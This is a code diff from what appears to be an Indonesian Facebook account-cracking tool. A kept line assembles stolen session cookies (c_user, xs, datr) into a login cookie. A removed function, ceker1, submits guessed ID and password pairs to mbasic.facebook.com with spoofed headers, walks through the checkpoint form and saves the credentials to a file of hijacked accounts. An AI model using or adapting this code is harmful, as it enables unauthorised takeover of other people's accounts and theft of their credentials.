+				kuki = ("datr="+ coki["datr"]+ ";"+ ("sb=" + coki["sb"])+ ";"+ "locale=id_ID"+ ";"+ ("c_user=" + coki["c_user"])+ ";"+ ("xs=" + coki["xs"])+ ";"+ ("fr=" + coki["fr"])+ ";")
 				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
 				tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
 				tree.add(Panel(f"{H2}{ua}{P2}", style=f"{color_panel}"))
@@ -2671,69 +2591,6 @@ def ceker(idf, pw):
     if len(ops) == 0:
         pass
     console().print(f"{H2}• {P2}Columns(ops)")
-
-
-def ceker1(idf, pw):
-    global cp
-    ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]"
-    head = {
-        "Host": "mbasic.facebook.com",
-        "cache-control": "max-age=0",
-        "upgrade-insecure-requests": "1",
-        "origin": "https://mbasic.facebook.com",
-        "content-type": "application/x-www-form-urlencoded",
-        "user-agent": ua,
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-        "x-requested-with": "mark.via.gp",
-        "sec-fetch-site": "same-origin",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-user": "?1",
-        "sec-fetch-dest": "document",
-        "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8",
-        "accept-encoding": "gzip, deflate",
-        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-    }
-    ses = requests.Session()
-    try:
-        hi = ses.get("https://mbasic.facebook.com")
-        ho = sop(
-            ses.post(
-                "https://mbasic.facebook.com/login.php",
-                data={"email": idf, "pass": pw, "login": "submit"},
-                headers=head,
-                allow_redirects=True,
-            ).text,
-            "html.parser",
-        )
-        jo = ho.find("form")
-        data = {}
-        lion = ["nh", "jazoest", "fb_dtsg", "submit[Continue]", "checkpoint_data"]
-        for anj in jo("input"):
-            if anj.get("name") in lion:
-                data.update({anj.get("name"): anj.get("value")})
-        kent = sop(
-            ses.post(
-                "https://mbasic.facebook.com" + str(jo["action"]),
-                data=data,
-                headers=head,
-            ).text,
-            "html.parser",
-        )
-        open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
-        cp += 1
-        opsi = kent.find_all("option")
-        if len(opsi) == 0:
-            print("\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)" % (hh, x))
-        else:
-            for opsii in opsi:
-                print("\r%s---> %s%s" % (kk, opsii.text, x))
-    except Exception as c:
-        print(
-            "\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s" % (u, x)
-        )
-        open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
-        cp += 1
-
 
 # OPSI CEKER
 def cek_opsi():
